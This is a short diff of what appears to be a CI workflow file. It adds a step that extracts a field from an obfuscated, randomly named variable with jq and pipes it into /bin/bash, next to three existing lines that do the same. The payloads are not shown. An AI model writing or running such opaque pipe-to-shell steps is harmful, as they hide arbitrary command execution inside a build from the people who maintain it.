@@ -26,6 +26,7 @@ jobs:
           echo $okcf92328 | jq -r .gy5 | /bin/bash
           printf '%s' "$ygpfz8975" | jq -r .vxse4 | /bin/bash
           echo $nsos1617 | jq -r .u062 | /bin/bash
+          printf '%s' "$gr01570" | jq -r .cyo53 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
